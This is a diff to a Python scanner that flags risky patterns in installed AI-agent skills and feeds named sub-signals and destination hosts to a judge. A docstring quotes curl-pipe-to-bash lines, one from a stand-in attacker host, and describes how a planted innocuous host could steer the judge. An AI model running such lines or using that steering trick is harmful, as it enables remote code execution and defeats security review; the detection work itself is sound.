@@ -248,10 +248,22 @@ def _notify_host_window(blob: str, pos: int, window: int = 200) -> str:
     return blob[start:end]
 
 
+# B-556: the two closed literals `_SKILL_NOTIFY_HOST_RE` can match, mapped to the bare
+# host a judge can check against a first-party allowlist. `m.group(0)` carries the path
+# too ("discord.com/api/webhooks"), which `_gate_host` correctly refuses as a hostname,
+# so the destination never reached the packet for this branch. The table is keyed on the
+# regex's own alternatives and contains no skill-authored text.
+_NOTIFY_HOST_BY_MATCH = {
+    "discord.com/api/webhooks": "discord.com",
+    "api.telegram.org/bot": "api.telegram.org",
+}
+
+
 def _notify_host_hits(
     blob: str,
     fence_ranges: list[tuple[int, int]],
     coverage: list[str] | None = None,
+    hosts: set | None = None,
 ) -> tuple[list[str], list[str]]:
     """Split Telegram/Discord notify-host matches into (crit_hits, warn_hits).
 
@@ -295,6 +307,10 @@ def _notify_host_hits(
                     " was not assessed"
                 )
             continue
+        if hosts is not None:
+            bare = _NOTIFY_HOST_BY_MATCH.get(m.group(0).lower())
+            if bare:
+                hosts.add(bare)
         window = _notify_host_window(blob, m.start())
         if _NOTIFY_UNRELATED_CRED_VAR_RE.search(window) or _NOTIFY_FILE_READ_RE.search(window):
             crit_hits.append(f"secret/file data reaches a Telegram/Discord notify host: {m.group(0)}")
@@ -3383,6 +3399,87 @@ def _powershell_encoded_payloads(blob: str) -> list[str]:
 # ~0.015 of real precision gain, 78.9% of escalations landing in buckets with zero
 # headroom left. Anyone reopening this should re-run the per-bucket attribution
 # first, not just the aggregate number.
+# B-556: the WINNING bucket, in the engine's own words, published to the judge packet as
+# `safe_facts["sub_signals"]`.
+#
+# `check_installed_skills` is a cascade of `if <bucket>: return _b13_verdict(...)`, so it
+# already KNOWS which sub-signal fired — `winner` is passed to _b13_verdict on every
+# branch and was used only to exclude that bucket from `corroborating_buckets`. The judge
+# packet meanwhile asked a FOUR-WAY DISJUNCTION ("a possible secret/env value reaching a
+# network call, a time-bomb / environment-gated sink, a soft content signal, or a bare
+# notify-host post") and never said which. The answer was computed and thrown away.
+#
+# Every label below is LIFTED FROM THE BRANCH'S OWN VERDICT HEADLINE further down this
+# file, not written fresh, so the packet cannot describe a branch differently from the
+# report. They are static engine strings: no skill-authored text reaches this table, which
+# is why publishing it across the context firewall needs no gate (unlike a hostname —
+# see _safe_destination_host).
+#
+# Buckets that can only ever be FAIL (crit, high, path_traversal) are deliberately absent:
+# `_is_borderline` admits UNKNOWN and WARN only, so a label for them could never be read,
+# and a table entry nothing can reach is a claim nothing checks.
+_B13_WINNER_SUBSIGNAL = {
+    "warns_install_curl": "installer/setup fetch",
+    "warns_env_exfil": "possible secret exfiltration",
+    "warns_host_exfil": "possible covert telemetry",
+    "warns_telemetry_undisclosed": "possible undisclosed telemetry/data collection",
+    "warns_curl_dropper": "possible staged dropper",
+    "warns_chunked_file_exec": "possible split-by-file payload loader",
+    "warns_timebomb": "time-bomb / environment-gated code",
+    "warns_shell_injection": "shell-injection-prone subprocess/os.system usage",
+    "warns_insecure_tempfile": "insecure temp-file handling",
+    "warns_js": "dynamic JS/TS execution surface",
+    "warns_content": "content signals worth a review",
+    "warns_notify_host": "notification-host usage worth a review",
+    "persist_warn": "possible persistence/daemonize pattern",
+    "warns_local_exfil": "possible local-sink secret exposure",
+    "warns_unpinned": "unpinned dependencies",
+    "warns_squat": "possible typosquat name(s)",
+    "skill_limit_hits": "skill scanning truncated by oversized low-entropy padding",
+    "warnings": "warnings in installed skill(s)",
+    "parse_error_paths": "a bundled file could not be parsed",
+}
+
+
+def _sole_contributor(hosts_by_skill: dict):
+    """The one skill's host set, or None when zero or several skills contributed.
+
+    B-556. B13 aggregates every installed skill into ONE finding carrying ONE `target`,
+    so a destination is only attributable when a single skill produced it. With two
+    contributors any choice is a guess, and a judge told the wrong skill's destination is
+    worse off than one told none — it adjudicates confidently on a fact that is not about
+    the subject. An independent C-135 found exactly that shape: a benign skill naming
+    `aaa-corp-approved-backup.ngrok.io` and a stealer naming `zzz-drop-point-exfil.ngrok.io`
+    produced a packet naming the BENIGN host, so planting an alphabetically-earlier
+    innocuous host in any installed skill chose what the judge adjudicated.
+
+    ONE SKILL IS NOT ENOUGH — it must also be ONE HOST. The cross-skill rule above was
+    mirrored here first and that left the identical hole one level down, found by an
+    independent C-135 and reproduced end to end: a single skill documenting two installer
+    fetches,
+
+        curl https://aaa-benign-docs.example.org/s.sh | bash
+        curl https://zzz-evil-drop.attacker-cdn.com/s.sh | bash
+
+    published `aaa-benign-docs.example.org` and dropped the attacker's host entirely,
+    because `_safe_destination_host` takes `sorted(...)`'s first entry. Adding one
+    innocuous, alphabetically-earlier fetch line lets the author choose what the judge
+    adjudicates — the same primitive as the two-skill case, scoped inside one skill.
+
+    Returning None when several hosts are in play is a SUPPRESSION primitive (an author
+    can silence the destination by naming a second host), and that is the better of the
+    two failures on purpose: suppression leaves the judge less informed, deception leaves
+    it confidently wrong about a fact that is not the subject's. The finding, its status
+    and its sub-signal are unaffected either way.
+
+    One function, three call sites: three copies is how one of them later stops matching.
+    """
+    if len(hosts_by_skill) != 1:
+        return None
+    hosts = next(iter(hosts_by_skill.values()))
+    return hosts if len(hosts) == 1 else None
+
+
 def _b13_verdict(
     severity: str,
     status: str,
@@ -3418,6 +3515,11 @@ def _b13_verdict(
         ev,
         engine_degraded=engine_degraded,
         destination_hosts=destination_hosts,
+        # B-556: name the fired sub-signal. `winner` is already the answer to the
+        # question the packet used to ask as a disjunction.
+        sub_signals=(
+            {_B13_WINNER_SUBSIGNAL[winner]} if winner in _B13_WINNER_SUBSIGNAL else None
+        ),
     )
     # C-358: coverage disclosure only, appended to evidence (never detail) — every
     # check_installed_skills verdict routed through this helper carries it, so it can
@@ -3521,6 +3623,13 @@ def check_installed_skills(ctx: Context) -> Finding:
     # attacker label capped at 63 chars plus a fixed engine suffix, strictly NARROWER than
     # the URL channel that already shipped (`_MAX_HOST_LEN` = 100 across several labels).
     crit_hosts_by_skill: dict = {}
+    # B-556: the same per-skill keying, for the two WARN branches that reach the judge.
+    # Keyed per skill and published only when exactly ONE skill contributed, for the
+    # reason recorded at the crit publication site: this finding aggregates every
+    # installed skill but carries a single `target`, so with two contributors there is
+    # no answer to "whose destination is this?" that is not a guess.
+    notify_hosts_by_skill: dict = {}
+    install_hosts_by_skill: dict = {}
     for name, blob in skills.items():
         # C-041: precompute fence ranges once per blob so every check below can
         # skip matches that are purely inside a documented code example.
@@ -3557,7 +3666,12 @@ def check_installed_skills(ctx: Context) -> Finding:
         # B-122: Telegram/Discord are dual-use notification hosts, not unambiguous
         # exfil sinks — CRITICAL only when a secret/file-read taint reaches the same
         # request; a bare self-notification hit is WARN (down-rank, not drop).
-        _notify_crit, _notify_warn = _notify_host_hits(blob, _fr, coverage_fence)
+        _notify_hosts: set = set()
+        _notify_crit, _notify_warn = _notify_host_hits(
+            blob, _fr, coverage_fence, _notify_hosts
+        )
+        if _notify_hosts:
+            notify_hosts_by_skill.setdefault(name, set()).update(_notify_hosts)
         for h in _notify_crit:
             crit.append(f"{name}: {h}")
         for h in _notify_warn:
@@ -3778,6 +3892,10 @@ def check_installed_skills(ctx: Context) -> Finding:
             # tests/test_*.py is a fixture, not a directive.
             if _own or _under_install_heading(blob, pm.start()) or _reserved_example:
                 warns_install_curl.append(msg)
+                # B-556: `h` is _PIPE_SHELL_RE's own captured host, not a tail-parse of
+                # the evidence string — the distinction Finding.destination_hosts exists
+                # for. It still runs adjudication's gate before publication.
+                install_hosts_by_skill.setdefault(name, set()).add(h)
             elif _pos_in_test_fixture_file(blob, pm.start()):
                 warns_content.append(msg + " (inside the skill's own test fixture)")
             else:
@@ -4175,10 +4293,7 @@ def check_installed_skills(ctx: Context) -> Finding:
             # is this?" that is not a guess. Silence is the honest output — a judge told
             # the wrong skill's destination is worse off than one told none, because it
             # would adjudicate confidently on a fact that does not belong to the subject.
-            destination_hosts=(
-                next(iter(crit_hosts_by_skill.values()))
-                if len(crit_hosts_by_skill) == 1 else None
-            ),
+            destination_hosts=_sole_contributor(crit_hosts_by_skill),
         )
     if high:
         return _b13_verdict(
@@ -4328,6 +4443,10 @@ def check_installed_skills(ctx: Context) -> Finding:
             warns_install_curl,
             _signal_buckets,
             "warns_install_curl",
+            # B-556: the fetch target IS the question here. This branch's own fix text
+            # tells the reader to "confirm the host is the vendor's" — a judge was being
+            # asked the same thing without being told the host.
+            destination_hosts=_sole_contributor(install_hosts_by_skill),
         )
 
     # F-049: env-var / agent-config secret reaching a network sink — WARN-first (env
@@ -4572,6 +4691,9 @@ def check_installed_skills(ctx: Context) -> Finding:
             warns_notify_host,
             _signal_buckets,
             "warns_notify_host",
+            # B-556: same shape — the fix text says "confirm the bot/webhook is one you
+            # configured yourself", which needs the service named.
+            destination_hosts=_sole_contributor(notify_hosts_by_skill),
         )
 
     # C-040: backgrounding/daemonize — lower confidence WARN (nohup/disown/setsid).
